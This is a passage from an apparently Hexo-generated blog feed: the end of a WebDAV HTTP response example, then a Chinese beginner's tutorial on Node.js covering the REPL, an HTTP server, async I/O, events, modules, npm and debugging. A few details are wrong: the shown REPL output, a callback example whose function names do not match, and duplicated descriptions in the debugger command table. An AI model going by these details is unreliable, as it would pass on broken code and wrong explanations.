12345678910111213141516171819202122232425262728HTTP/1.1 207 Multi-StatusContent-Type: application/xml; charset="utf-8"Content-Length: 831&lt;?xml version="1.0" encoding="utf-8" ?&gt;&lt;D:multistatus xmlns:D="DAV:"&gt; &lt;D:response xmlns:R="http://ns.example.com/boxschema/"&gt; &lt;D:href&gt;http://www.example.com/file&lt;/D:href&gt; &lt;D:propstat&gt; &lt;D:prop&gt; &lt;R:bigbox&gt; &lt;R:BoxType&gt;Box type A&lt;/R:BoxType&gt; &lt;/R:bigbox&gt; &lt;R:author&gt; &lt;R:Name&gt;J.J. Johnson&lt;/R:Name&gt; &lt;/R:author&gt; &lt;/D:prop&gt; &lt;D:status&gt;HTTP/1.1 200 OK&lt;/D:status&gt; &lt;/D:propstat&gt; &lt;D:propstat&gt; &lt;D:prop&gt;&lt;R:DingALing/&gt;&lt;R:Random/&gt;&lt;/D:prop&gt; &lt;D:status&gt;HTTP/1.1 403 Forbidden&lt;/D:status&gt; &lt;D:responsedescription&gt; The user does not have access to the DingALing property. &lt;/D:responsedescription&gt; &lt;/D:propstat&gt; &lt;/D:response&gt; &lt;D:responsedescription&gt; There has been an access violation error. &lt;/D:responsedescription&gt;&lt;/D:multistatus&gt; 参考链接：https://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[好玩的Nodejs —— Node.js快速入门]]></title>
    <url>%2F2018-09-13-NodeJs-Part3.html</url>
    <content type="text"><![CDATA[主要内容： 编写第一个 Node.js 程序 异步式 I/O 和事件循环 模块和包 调试 Node.js 快速入门Node.js 具有深厚的开源血统，它诞生于托管了许多优秀开源项目的网站—— github。 开始使用 Node.js 编程Hello World打开常用文本编辑器，输入 1console.log('Hello World'); 文件保存为 helloworld.js ，打开终端，进入文件所在的目录，执行以下命令 1node helloworld.js 就可以在终端看到输出 Hello World console 是 Node.js 提供的控制台对象，其中包含了向标准输出写入的操作，如 console.log 、console.error Node.js 命令行工具终端输入 node –help 可以看到详细的帮助信息。 C:\Users\Administrator\Desktop&gt;node –helpUsage: node [options][ -e script | script.js | - ] [arguments] node inspect script.js [arguments] Options: -v, –version print Node.js version -e, –eval script evaluate script -p, –print evaluate script and print result -c, –check syntax check script without executing -i, –interactive always enter the REPL even if stdin does not appear to be a terminal -r, –require module to preload (option can be repeated) script read from stdin (default; interactive mode if a tty)–inspect[=[host:]port] activate inspector on host:port(default: 127.0.0.1:9229)–inspect-brk[=[host:]port]activate inspector on host:portand break at start of user script–inspect-port=[host:]portset host:port for inspector–no-deprecation silence deprecation warnings–trace-deprecation show stack traces on deprecations–throw-deprecation throw an exception on deprecations–pending-deprecation emit pending deprecation warnings–no-warnings silence all process warnings–napi-modules load N-API modules (no-op - optionkept for compatibility)–abort-on-uncaught-exceptionaborting instead of exiting causes acore file to be generated for analysis–trace-warnings show stack traces on process warnings–redirect-warnings=filewrite warnings to file instead ofstderr–trace-sync-io show stack trace when use of sync IOis detected after the first tick–force-async-hooks-checksenables checks for async_hooks–trace-events-enabled track trace events–trace-event-categories comma separated list of trace eventcategories to record–track-heap-objects track heap object allocations for heap snapshots–prof-process process v8 profiler output generatedusing –prof–zero-fill-buffers automatically zero-fill all newly allocatedBuffer and SlowBuffer instances–v8-options print v8 command line options–v8-pool-size=num set v8’s thread pool size–tls-cipher-list=val use an alternative default TLS cipher list–use-bundled-ca use bundled CA store (default)–use-openssl-ca use OpenSSL’s default CA store–openssl-config=file load OpenSSL configuration from thespecified file (overridesOPENSSL_CONF)–icu-data-dir=dir set ICU data load path to dir(overrides NODE_ICU_DATA)–preserve-symlinks preserve symbolic links when resolving–experimental-modules experimental ES Module supportand caching modules Environment variables:NODE_DEBUG ‘,’-separated list of core modules that should print debug informationNODE_DISABLE_COLORS set to 1 to disable colors in the REPLNODE_EXTRA_CA_CERTS path to additional CA certificates fileNODE_ICU_DATA data path for ICU (Intl object) dataNODE_NO_WARNINGS set to 1 to silence process warningsNODE_NO_HTTP2 set to 1 to suppress the http2 moduleNODE_OPTIONS set CLI options in the environment via a space-separated listNODE_PATH ‘;’-separated list of directories prefixed to the module search pathNODE_PENDING_DEPRECATION set to 1 to emit pending deprecation warningsNODE_REPL_HISTORY path to the persistent REPL history fileNODE_REDIRECT_WARNINGS write warnings to path instead of stderrOPENSSL_CONF load OpenSSL configuration from file Documentation can be found at https://nodejs.org/ 其中显示了 node 的用法，运行 Node.js 程序的基本方法就是执行 node script.js ，其中 script.js 是脚本的文件名。 除了直接运行脚本文件外， node –help 显示的使用方法中说明了另一种输出 HelloWorld 的方式： 12$ node -e "console.log('Hello World');"Hello World 我们可以把要执行的语句作为 node -e 的参数直接执行。 使用 node 的 REPL 模式REPL （Read-eval-print loop），即输入—求值—输出循环,运行无参数的 node 将会启动一个 JavaScript的交互式 shell： 123$ node&gt; console.log('1');ReferenceError: console is not defined 进入 REPL 模式以后，会出现一个“ &gt; ”提示符提示你输入命令，输入后按回车，Node.js将会解析并执行命令。如果你执行了一个函数，那么 REPL 还会在下面显示这个函数的返回值. 如果你输入了一个错误的指令，REPL 则会立即显示错误并输出调用栈。在任何时候，连续按两次 Ctrl + C 即可推出Node.js 的 REPL 模式。 建立 HTTP 服务器Node.js 是为网络而诞生的平台，但又与 ASP、PHP 有很大的不同，究竟不同在哪里呢？ PHP 架构是一种“浏览器 - HTTP 服务器 - PHP 解释器”的组织方式。而 Node.js 则是 “浏览器 - Node” 创建一个HTTP 服务器，建立一个名为 app.js 的文件，内容如下： 12345678var http = require('http');http.createServer(function(req, res)&#123; res.writeHead(200, &#123;'Content-Type': 'text/html'&#125;); res.write('&lt;h1&gt;Node.js&lt;/h1&gt;'); res.end('&lt;p&gt;Hello World&lt;/p&gt;');&#125;).listen(3000);console.log("HTTP server is listening at port 3000."); 接下来运行 node app.js 命令，打开浏览器访问 http://127.0.0.1:3000 就可以看到以下内容 用 Node.js 实现的最简单的 HTTP 服务器就这样诞生了。这个程序调用了 Node.js 提供的http 模块，对所有 HTTP 请求答复同样的内容并监听 3000 端口。在终端中运行这个脚本时，我们会发现它并不像 Hello World 一样结束后立即退出，而是一直等待，直到按下 Ctrl +C 才会结束。这是因为 listen 函数中创建了事件监听器，使得 Node.js 进程不会退出事件循环。 小技巧——使用 supervisorupervisor 监视你对代码的改动，并自动重启 Node.js，但是浏览器还是得手动刷新。使用方法很简单，首先使用 npm 安装 supervisor： 1234567891011$ supervisor app.js Running node-supervisor with program 'app.js' --watch '.' --extensions 'node,js' --exec 'node'Starting child process with 'node app.js'Watching directory 'C:\Users\Administrator\Desktop' for changes.Press rs for restarting the process.HTTP server is listening at port 3000. 当代码变化的时候，运行的脚本会被终止，然后重新启动： 123crashing childStarting child process with 'node app.js'HTTP server is listening at port 3000. supervisor 这个小工具可以解决开发中的调试问题。 异步式 I/O 与事件式编程Node.js 最大的特点就是异步式 I/O（或者非阻塞 I/O）与事件紧密结合的编程模式。这种模式与传统的同步式 I/O 线性的编程思路有很大的不同，因为控制流很大程度上要靠事件和回调函数来组织，一个逻辑要拆分为若干个单元。 阻塞与线程什么是阻塞（block）呢？线程在执行中如果遇到磁盘读写或网络通信（统称为 I/O 操作），通常要耗费较长的时间，这时操作系统会剥夺这个线程的 CPU 控制权，使其暂停执行，同时将资源让给其他的工作线程，这种线程调度方式称为 阻塞。当 I/O 操作完毕时，操作系统将这个线程的阻塞状态解除，恢复其对CPU的控制权，令其继续执行。这种 I/O 模式就是通常的同步式 I/O（Synchronous I/O）或阻塞式 I/O （Blocking I/O）。 相应地，异步式 I/O （Asynchronous I/O）或非阻塞式 I/O （Non-blocking I/O）则针对所有 I/O 操作不采用阻塞的策略。当线程遇到 I/O 操作时，不会以阻塞的方式等待 I/O 操作的完成或数据的返回，而只是将 I/O 请求发送给操作系统，继续执行下一条语句。当操作系统完成 I/O 操作时，以事件的形式通知执行 I/O 操作的线程，线程会在特定时候处理这个事件。为了处理异步 I/O，线程必须有事件循环，不断地检查有没有未处理的事件，依次予以处理。 阻塞模式下，一个线程只能处理一项任务，要想提高吞吐量必须通过多线程。而非阻塞模式下，一个线程永远在执行计算操作，这个线程所使用的 CPU 核心利用率永远是 100%，I/O 以事件的方式通知。在阻塞模式下，多线程往往能提高系统吞吐量，因为一个线程阻塞时还有其他线程在工作，多线程可以让 CPU 资源不被阻塞中的线程浪费。而在非阻塞模式下，线程不会被 I/O 阻塞，永远在利用 CPU。多线程带来的好处仅仅是在多核 CPU 的情况下利用更多的核，而Node.js的单线程也能带来同样的好处。这就是为什么 Node.js 使用了单线程、非阻塞的事件编程模式。 假设我们有一项工作，可以分为两个计算部分和一个 I/O 部分，I/O 部分占的时间比计算多得多（通常都是这样）。如果我们使用阻塞 I/O，那么要想获得高并发就必须开启多个线程。而使用异步式 I/O时，单线程即可胜任。 单线程时间驱动的异步式 I/O 比传统的多线程阻塞式 I/O 究竟好在哪里？ 简而言之。异步式 I/O 就是少了多线程的开销，对操作系统来说，创建一个线程的代价是十分昂贵的，需要给它分配内存，列入调度，同时在线程切换的时候还要执行内存换页，CPU 的缓存被清空，切换回来的时候还要重新从内存中读取信息，破坏了数据的局限性（基于多线程的模型也有相应的解决方案，如轻量级线程（lightweight thread）等。事件驱动的单线程异步模型与多线程同步模型到底谁更好是一件非常有争议的事情，因为尽管消耗资源，后者的吞吐率并不比前者低。）。 当然异步式编程的缺点在于不符合人们一把你的程序设计思维，容易让控制流变得晦涩难懂，给编码和调试都带来了不小困难。 下表比较了同步式 I/O 和异步式 I/O 的特点。 同步I/O（阻塞式） 异步式I/O（非阻塞式） 利用多线程提供吞吐量 单线程即可实现高吞吐量 通过事件片分割和线程调度利用多核 CPU 通过功能划分利用多核 CPU 需要操作由操作系统调度多线程使用多核 CPU 可以将单进程绑定到单核 CPU 难以充分利用 CPU 资源 可以充分利用 CPU 资源 内存轨迹大、数据局部性弱 内存轨迹小、数据局部性强 符合线性的编程思维 不符合传统编程思维 回调函数Node.js 中如何使用异步的方式读取一个文件，例子如下： file.text 1你好呀！ 1234567891011// readfile.jsvar fs = require('fs');fs.readFile('file.text', 'utf-8', function(err, data) &#123; if (err) &#123; console.log(err); &#125; else &#123; console.log(data); &#125;&#125;);console.log('end'); 运行结果如下 12end你好呀！ Node.js 也提供了同步读取文件的 API 123456//readfilesync.jsvar fs = require('fs');var data = fs.readFileSync('file.text', 'utf-8');console.log(data);console.log('end'); 运行的结果与上一个有点不一样 123$ node readfilesync.js你好呀！end 同步式读取文件时，将文件名作为参数传入 fs.readFileSync 函数，阻塞等待读取完成后，将文件的内容作为函数的返回值赋给 data 变量，接下来，控制台输出 data 的值，最后输出 end。 异步式读取文件则是 end 先被输出。fs.readFile 接受了三个参数，第一个是文件名，第二个是编码方式，第三个是一个函数，我们称这个函数为回调函数。 JavaScript 支持匿名的函数定义方式。这种定义方式在 JavaScript 程序中极为普遍，与下面这种定义方式实现的功能是一致的： 123456789101112//readfilecallback.jsfunction readfilecallback(err, data) &#123; if (err) &#123; console.log(err); &#125; else &#123; console.log(data); &#125;&#125;var fs = require('fs');fs.readFile('file.text', 'utf-8', readFileCallBack);console.log('end'); fs.readFile 调用时所做的工作只是将异步式 I/O 请求发送给了操作系统，然后立即返回并执行了后面的语句，执行完以后进入事件循环监听事件。当 fs 接受到了 I/O 请求完成的事件时，事件循环会主动调用函数以后完成后续工作。因此我们会先看到 end ，然后再看到 文件中的内容。 事件Node.js 所有异步 I/O 操作在完成时都会发送一个事件到事件队列。事件由 EventEmitter 对象提供。fs.readFile 和 http.createServer 的回调函数都是通过 EventEmitter 来实现的。 123456789101112// event.js var EventEmitter = require('events').EventEmitter;var event = new EventEmitter();event.on('some_event', function() &#123; console.log('some_event occured.');&#125;)setTimeout(function() &#123; event.emit('some_event');&#125;, 1000); 运行这段代码，1秒后控制台输出了 some_event occured. 。其原理是 event 对象注册了事件 some_event 的一个监听器，然后我们通过 setTimeout 在1000毫秒以后向event 对象发送事件 some_event ，此时会调用 some_event 的监听器。 Node.js 的事件循环机制Node.js 在什么时候会进入事件循环呢？ Node.js 程序由事件循环开始，直到事件循环结束，所有逻辑都是事件的回调函数，所以 Node.js 始终在事件循环中，程序入口就是事件循环第一个事件的回调函数。事件的回调函数在执行的过程中，可能会发出 I/O 请求或直接发射（emit）事件，执行完毕后再返回事件循环，事件循环会检查事件队列中有没有未处理的事件，直到程序结束。下图说明了事件循环的原理。 与其他语言不同的是，Node.js 没有显式的事件循环。Node.js 的事件循环对开发者不可见，由 libev 库实现。 libev支持多种类型的事件，如 ev_io 、 ev_timer 、 ev_signal 、 ev_idle 等，在 Node.js 中均被EventEmitter 封装。 libev 事件循环的每一次迭代，在 Node.js 中就是一次 Tick， libev 不断检查是否有活动的、可供检测的事件监听器，直到检测不到时才退出事件循环，进程结束。 模块和包模块（Module）和包（Package）是 Node.js 最重要的支柱。开发一个具有一定规模的程序不可能只用一个文件，通常需要把各个功能拆分、封装，然后组合起来，模块正是为了实现这种方式而诞生的。在浏览器 JavaScript 中，脚本模块的拆分和组合通常使用 HTML 的script 标签来实现。Node.js 提供了 require 函数来调用其他模块，而且模块都是基于文件的，机制十分简单。Node.js 的模块和包机制的实现参照了 CommonJS 的标准，但并未完全遵循。不过两者的区别并不大。只有试图制作一个除了支持 Node.js之外还要支持其他平台的模块或包的时候才需要仔细研究。通常，两者没有直接冲突的地方。 我们经常把 Node.js 的模块和包相提并论，因为模块和包是没有本质区别的，两个概念也时常混用。如果要辨析，那么可以把包理解成是实现了某个功能模块的集合，用于发布和维护。对使用者来说，模块和包的区别是透明的，因此经常不作区分。 什么是模块模块是 Node.js 应用程序的基本组成部分，文件和模块是一一对应的。换言之，一个Node.js 文件就是一个模块，这个文件可能是 JavaScript 代码、JSON 或者编译过的 C/C++ 扩展。 在前面例子中，曾经用到了 var http = require(‘http’)， 其中 http是 Node.js 的一个核心模块，其内部是用 C++ 实现的，外部用 JavaScript 封装。我们通过require 函数获取了这个模块，然后才能使用其中的对象。 创建及加载模块创建模块Node.js 中，一个文件就是一个模块，Node.js提供了 exports 和 require 两个对象，其中 exports 是模块公开的接口， require 用于从外部获取一个模块的即可欧，即获取模块的 exports 对象。 创建一个 module.js 文件。 123456789// module.jsvar name;exports.setName = function(thyName) &#123; name = thyName;&#125;exports.sayHello = function() &#123; console.log('Hello ' + name);&#125; 在同一目录下，创建一个 getmodule.js 12345// getmodule.jsvar myModule = require('./module');myModule.setName('NodeJs');myModule.sayHello(); 运行node getmodule.js，结果是： 1Hello NodeJs 在以上示例中，module.js 通过 exports 对象把 setName 和 sayHello 作为模块的访问接口，在 getmodule.js 中通过 require(&#39;./module&#39;) 加载这个模块，然后就可以直接访问 module.js 中 exports 对象的成员函数了。 这种接口封装方式比许多语言要简洁得多，同时也不失优雅，未引入违反语义的特性，符合传统的编程逻辑。在这个基础上，我们可以构建大型的应用程序，npm 提供的上万个模块都是通过这种简单的方式搭建起来的。 单次加载上面这个例子有点类似于创建一个对象，但实际上和对象又有本质的区别，因为 require 不会重复加载模块，也就是说无论调用多少次 require， 获得的模块都是同一个。在 getmodule.js 的基础上稍作修改： 123456//loadmodule.jsvar hello1 = require('./module');hello1.setName('NAME 1');var hello2 = require('./module');hello2.setName('NAME 2');hello1.sayHello(); 运行后发现输出结果是 NAME 2 ，这是因为变量 hello1 和 hello2 指向的是同一个实例，因此 hello1.setName 的结果被 hello2.setName 覆盖，最终输出结果是由后者决定的。 覆盖 exports有时候我们只是想把一个对象封装到模块中，例如： 1234567891011//singleobject.jsfunction Hello() &#123; var name; this.setName = function(thyName) &#123; name = thyName; &#125;; this.sayHello = function() &#123; console.log('Hello ' + name); &#125;;&#125;;exports.Hello = Hello; 此时我们在其他文件中需要通过 require(‘./singleobject’).Hello 来获取Hello 对象，这略显冗余，可以用下面方法稍微简化： 123456789101112//hello.jsfunction Hello() &#123; var name; this.setName = function(thyName) &#123; name = thyName; &#125;; this.sayHello = function() &#123; console.log('Hello ' + name); &#125;;&#125;;module.exports = Hello; 这样就可以直接获得这个对象了 12345//gethello.jsvar Hello = require('./hello');hello = new Hello();hello.setName('NAME 3');hello.sayHello(); 注意，模块接口的唯一变化是使用 module.exports = Hello 代替了 exports.Hello=Hello 。在外部引用该模块时，其接口对象就是要输出的 Hello 对象本身，而不是原先的exports 。 事实上， exports 本身仅仅是一个普通的空对象，即 {} ，它专门用来声明接口，本质上是通过它为模块闭包的内部建立了一个有限的访问接口。因为它没有任何特殊的地方，所以可以用其他东西来代替，如上面例子中的 Hello 对象。 不可以通过对 exports 直接赋值代替对 module.exports 赋值。exports 实际上只是一个和 module.exports 指向同一个对象的变量，它本身会在模块执行结束后释放，但 module 不会，因此只能通过指定module.exports 来改变访问接口。 创建包包是在模块基础上更深一步的抽象，Node.js 的包类似于 C/C++ 的函数库或者 Java/.Net 的类库。它将某个独立的功能封装起来，用于发布、更新、依赖管理和版本控制。Node.js 根据 CommonJS 规范实现了包机制，开发了 npm 来解决包的发布和获取需求。 Node.js 的包是一个目录，其中包含了一个 JSON 格式的包说明文件 package.json 。严格符合 CommonJS 规范的包应该具备以下特征。 package.json 必须在包的目录下； 二进制文件应该在 bin 目录下； JavaScript 代码应该在 lib 目录下 文档应该在 doc 目录下 单元测试应该在 test 目录下 Node.js 对包的要求并没有这么严格。只要顶层目录下有一个 package.json，并符合一些规范即可。当然为了提高兼容性，还是建议在制作包的时候，严格遵守 CommonJS 规范。 作为文件夹的模块模块与文件是一一对应的。文件不仅可以是 JavaScript 代码或二进制代码，还可以是一个文件夹。最简单的包，就是一个作为文件夹的模块。下面我们来看一个例子，建立一个叫做 somepackage 的文件夹，在其中创建 index.js，内容如下： 12345//somepackage/index.jsexports.hello = function() &#123; console.log('Hello.');&#125; 然后在 somepackage 之外建立 getpackage.js 内容如下： 1234// getpackage.jsvar somePackage = require('./somepackage');somePackage.hello(); 运行 node getpackage.js，控制台将输出结果 Hello. 。 使用这种方法可以把文件夹封装为一个模块，即所谓的包。包通常是一些模块的集合，在模块的基础上提供了更高层的抽象，相当于提供了一些固定接口的函数库。通过定制package.json，我们可以创建更复杂、更完善、更符合规范的包用于发布。 package.json在somepackage 文件夹下，创建一个叫做 package.json 的文件，内容如下: 123&#123; "main": "./lib/interface.js"&#125; 然后将 index.js 重命名为 interface.js 并放入 lib 文件夹下面。以同样的方式再次调用这个包，依然可以正常使用。 Node.js 在调用某个包时，会首先检查包中 package.json 文件的 main 字段，将其作为包的接口模块，如果 package.json 或 main 字段不存在，会尝试寻找 index.js 或 index.node 作为包的接口。 package.json 是 CommonJS 规定的用来描述包的文件，完全符合规范的 package.json 文件应该含有以下字段。 name：包的名称，必须是唯一的，由小写英文、数字和下划线组成，不能包含空格。 description：包的简要说明。 version：符合语义化版本识别规范的版本字符串。 keywords：关键字数组，通常用于搜索、 maintainers：维护者数组，每个元素要包含 name、email（可选）、web（可选）字段。 contributions：贡献者数组，格式和 maintainers 相同。包的作者应该是贡献者数组的第一个元素。 bugs：提交 bug 的地址，可以是网址或者是电子邮件地址。 license：许可证数组，每个元素要包含 type（许可证的名称）和 url （链接到许可证文本的地址）子段。 respositories：仓库托管地址数组，每个元素要包含 type （仓库的类型，如 git）、url（仓库的地址）和 path（相对于仓库的路径，可选）字段。 dependencies：包的依赖，一个关联数组，由包名称和版本号组成。 下面是一个完全符合 CommonJS 规范的 package.json 示例： 123456789101112131415161718192021222324252627282930313233343536&#123; "name": "mypackage", "description": "Sample package for CommonJS. This package demonstrates the required elements of a CommonJS package.", "version": "0.7.0", "keywords": [ "package", "example" ], "maintainers": [&#123; "name": "Bill Smith", "email": "bills@example.com", &#125;], "contributors": [&#123; "name": "BYVoid", "web": "http://www.byvoid.com/" &#125;], "bugs": &#123; "mail": "dev@example.com", "web": "http://www.example.com/bugs" &#125;, "licenses": [&#123; "type": "GPLv2", "url": "http://www.example.org/licenses/gpl.html" &#125;], "repositories": [&#123; "type": "git", "url": "http://github.com/BYVoid/mypackage.git" &#125;], "dependencies": &#123; "webkit": "1.2", "ssl": &#123; "gnutls": ["1.0", "2.0"], "openssl": "0.9.8" &#125; &#125;&#125; Node.js 包管理器Node.js包管理器，即 npm 是 Node.js 官方提供的包管理工具，它已经成了 Node.js 包的标准发布平台，用于 Node.js 包的发布、传播、依赖控制。npm 提供了命令行工具，使你可以方便地下载、安装、升级、删除包，也可以让你作为开发者发布并维护包。 获取一个包使用 npm 安装包的命令格式为： npm [install/i][package_name] 例如你要安装 express ，可以在命令行运行： $ npm install express 或者： $ npm i express express 安装成功之后被放置在当前目录的 node_modules 子目录下。npm 在获取 express 的时候还将自动解析其依赖，并获取 express 依赖的 mime 、 mkdirp 、qs 和 connect 。 本地模式和全局模式npm 在默认情况下会从http://npmjs.org搜索或下载包，将包安装到当前目录的 node_modules 子目录下。 在使用 npm 安装包的时候，有两种模式：本地模式和全局模式。默认情况下我们使用 npm install 命令就是采用本地模式，即把包安装到当前目录的 node_modules 子目录下。Node.js 的 require 在加载模块时会尝试搜寻 node_modules 子目录，因此使用 npm 本地模式安装的包可以直接被引用。 npm 还有另一种不同的安装模式被成为全局模式，使用方法为： npm [install/i] -g [package_name] 与本地模式的不同之处就在于多了一个参数 -g 。 为什么要使用全局模式呢？多数时候并不是因为许多程序都有可能用到它，为了减少多重副本而使用全局模式，而是因为本地模式不会注册 PATH 环境变量。 我们安装 supervisor 是为了在命令行中运行它，假如直接运行 supervisor script.js，这时就需要在 PATH 环境变量中注册 supervisor。npm 本地模式仅仅是把包安装到 node_modules 子目录下，其中的 bin 目录没有包含在 PATH 环境变量中，不能直接在命令行中调用。而当使用全局模式安装时，npm 会将包安装到系统目录，譬如/usr/local/lib/node_modules/，同时 package.json 文件中 bin 字段包含的文件会被链接到 /usr/local/bin/。/usr/local/bin/ 是在 PATH 环境变量中默认定义的，因此就可以直接在命令行中运行 supervisor script.js 命令了。 使用全局模式安装的包并不能直接在 JavaScript 文件中用 require 获得，因为 require 不会搜索 /usr/local/lib/node_modules/。 本地模式和全局模式的特点 模式 可通过 require 使用 注册 PATH 本地模式 是 否 全局模式 否 是 总而言之，要把某个包作为工程运行时的一部分时，通过本地模式获取，如果要在命令行下使用，则使用全局模式安装。 创建全局链接npm 提供了一个有趣的命令 npm link， 它的功能是在本地包和全局包之间创建符号链接。使用全局模式安装的包不能直接通过 require 使用，但通过 npm link 命令可以打破这一限制。举个例子，我们已经通过 npm install -g express 安装了 express ，这时在工程的目录下运行命令： 12$ npm link express./node_modules/express -&gt; /usr/local/lib/node_modules/express 可以在 node_modules 子目录中发现一个指向安装到全局的包的符号链接。通过这种方法，我们就可以把全局包当本地包来使用了。(npm link 命令不支持 Windows。) 包的发布npm 可以非常方便地发布一个包，比 pip、gem、pear 要简单得多。在发布之前，首先需要让我们的包符合 npm 的规范，npm 有一套以 CommonJS 为基础包规范，但与 CommonJS并不完全一致，其主要差别在于必填字段的不同。通过使用 npm init 可以根据交互式问答产生一个符合标准的 package.json，例如创建一个名为 byvoidmodule 的目录，然后在这个目录中运行 npm init ： 1234567891011121314151617181920212223242526272829$ npm initPackage name: (byvoidmodule) byvoidmoduleDescription: A modulefor learning perpose.Package version: (0.0 .0) 0.0 .1Project homepage: (none) http: //www.byvoid.com/Project git repository: (none)Author name: BYVoidAuthor email: (none) byvoid.kcp @gmail.comAuthor url: (none) http: //www.byvoid.com/Main module / entry point: (none)Test command: (none)What versions of node does it run on ? (~0.6 .10)About to write to / home / byvoid / byvoidmodule / package.json &#123;"author": "BYVoid &lt;byvoid.kcp@gmail.com&gt; (http://www.byvoid.com/)","name": "byvoidmodule","description": "A module for learning perpose.","version": "0.0.1","homepage": "http://www.byvoid.com/","repository": &#123; "url": ""&#125;,"engines": &#123; "node": "~0.6.12"&#125;,"dependencies": &#123;&#125;,"devDependencies": &#123;&#125;&#125;Is this ok ? (yes) yes 这样就在 byvoidmodule 目录中生成一个符合 npm 规范的 package.json 文件。创建一个index.js 作为包的接口，一个简单的包就制作完成了。在发布前，我们还需要获得一个账号用于今后维护自己的包，使用 npm adduser 根据提示输入用户名、密码、邮箱，等待账号创建完成。完成后可以使用 npm whoami 测验是否已经取得了账号。 接下来，在 package.json 所在目录下运行 npm publish ，稍等片刻就可以完成发布了。打开浏览器，访问 http://search.npmjs.org/ 就可以找到自己刚刚发布的包了。现在我们可以在计算机上使用 npm install byvoidmodule 命令来安装它。 如果你的包将来有更新，只需要在 package.json 文件中修改 version 字段，然后重新使用 npm publish 命令就行了。如果你对已发布的包不满意（比如我们发布的这个毫无意义的包），可以使用 npm unpublish 命令来取消发布。 调试写程序时免不了遇到 bug，而当 bug 发生以后，除了抓耳挠腮之外，一个常用的技术是单步调试。Node.js 的调试功能正是由 V8 提供的，保持了一贯的高效和方便的特性。 那么如何使用 Node.js 内置的工具和第三方模块来进行单步调试？ 命令行调试12345678// debug.jsvar a = 1;var b = 'world';var c = function(x) &#123; console.log('hello ' + x + a);&#125;;c(b); 在命令行下执行 node debug debug.js ，将会启动调试工具： 1234567891011C:\Users\Administrator\Desktop&gt;node debug debug.js(node:12120) [DEP0068] DeprecationWarning: `node debug` is deprecated. Please use `node inspect` instead.&lt; Debugger listening on ws://127.0.0.1:9229/7df244e0-68fc-4469-8e55-fdff7dbbb0ed&lt; For help see https://nodejs.org/en/docs/inspectorBreak on start in debug.js:1&gt; 1 (function (exports, require, module, __filename, __dirname) &#123; var a = 1; 2 var b = 'world'; 3 var c = function(x) &#123;debug&gt; 这样就打开了一个 Node.js 的调试终端，用一些基本的命令进行单步跟踪调试. 命 令 功 能 run 执行脚本，在第一行暂停 restart 重新执行脚本 cont, c 继续执行，直到遇到下一个断点 next, n 单步执行 step, s 单步执行并进入函数 out, o 从函数中步出 setBreakpoint(), sb() 在当前行设置断点 setBreakpoint(‘f()’), sb(…) 在函数f的第一行设置断点 setBreakpoint(‘script.js’, 20), sb(…) 在 script.js 的第20行设置断点 setBreakpoint(‘script.js’, 20), sb(…) 显示当前执行到的前后5行代码 clearBreakpoint, cb(…) 显示当前执行到的前后5行代码 backtrace, bt 显示当前执行到的前后5行代码 list(5) 显示当前执行到的前后5行代码 watch(expr) 把表达式 expr 加入监视列表 unwatch(expr) 把表达式 expr 从监视列表移除 watchers 显示监视列表中所有的表达式和值 repl 在当前上下文打开即时求值环境 kill 终止当前执行的脚本 scripts 显示当前已加载的所有脚本 version 显示 V8 的版本 下面是简单的实例 1234567891011121314151617181920212223242526272829303132333435363738394041C:\Users\Administrator\Desktop&gt;node debug debug.js(node:30052) [DEP0068] DeprecationWarning: `node debug` is deprecated. Please use `node inspect` instead.&lt; Debugger listening on ws://127.0.0.1:9229/faddd156-7d49-4731-85c5-562a3b718eb7&lt; For help see https://nodejs.org/en/docs/inspectorBreak on start in debug.js:1&gt; 1 (function (exports, require, module, __filename, __dirname) &#123; var a = 1; 2 var b = 'world'; 3 var c = function(x) &#123;debug&gt; nbreak in debug.js:1&gt; 1 (function (exports, require, module, __filename, __dirname) &#123; var a = 1; 2 var b = 'world'; 3 var c = function(x) &#123;debug&gt; sb('debug.js',4) 1 (function (exports, require, module, __filename, __dirname) &#123; var a = 1; 2 var b = 'world'; 3 var c = function(x) &#123;&gt; 4 console.log('hello ' + x + a); 5 &#125;; 6 c(b); 7 &#125;);debug&gt; cbreak in debug.js:4 2 var b = 'world'; 3 var c = function(x) &#123;&gt; 4 console.log('hello ' + x + a); 5 &#125;; 6 c(b);debug&gt; replPress Ctrl + C to leave debug repl&gt; x'world'&gt; a + 12debug&gt; c&lt; hello world1&lt; Debugger attached.&lt; Waiting for the debugger to disconnect...debug&gt; 远程调试V8 提供的调试功能是基于 TCP 协议的，因此 Node.js 可以轻松地实现远程调试。在命令行下使用以下两个语句之一可以打开调试服务器： 12node --debug [= port ] script.jsnode --debug-brk [= port ] script.js node –debug 命令选项可以启动调试服务器，默认情况下调试端口是 5858，也可以使用 –debug=1234 指定调试端口为 1234。使用 –debug 选项运行脚本时，脚本会正常执行，但不会暂停，在执行过程中调试客户端可以连接到调试服务器。如果要求脚本暂停执行等待客户端连接，则应该使用 –debug-brk 选项。这时调试服务器在启动后会立刻暂停执行脚本，等待调试客户端连接。当调试服务器启动以后，可以用命令行调试工具作为调试客户端连接，例如： 12345678910111213//在一个终端中$ node --debug-brk debug.jsdebugger listening on port 5858//在另一个终端中$ node debug 127.0.0.1:5858connecting... okdebug&gt; nbreak in /home/byvoid/debug.js:2 1 var a = 1; 2 var b = 'world'; 3 var c = function (x) &#123; 4 console.log('hello ' + x + a);debug&gt; 使用 node-inspector 调试 Node.js大部分基于 Node.js 的应用都是运行在浏览器中的，例如强大的调试工具 node-inspector。node-inspector 是一个完全基于 Node.js 的开源在线调试工具，提供了强大的调试功能和友好的用户界面，它的使用方法十分简便。首先，使用 npm install -g node-inspector 命令安装 node-inspector，然后在终端中通过 node –debug-brk=5858 debug.js 命令连接你要除错的脚本的调试服务器，启动 node-inspector： $ node-inspector 在浏览器中打开 http://127.0.0.1:8080/debug?port=5858 ， 即可显示出优雅的 Web 调试工具.node-inspector 的使用方法十分简单，和浏览器脚本调试工具一样，支持单步、断点、调用栈帧查看等功能。（node-inspector 使用了 WebKit Web Inspector，因此只能在 Chrome、Safari等 WebKit 内核的浏览器中使用，而不支持 Firefox 或 Internet Explorer。）]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[好玩的Nodejs —— 安装和配置 Node.js]]></title>
    <url>%2F2018-09-13-NodeJs-Part2.html</url>
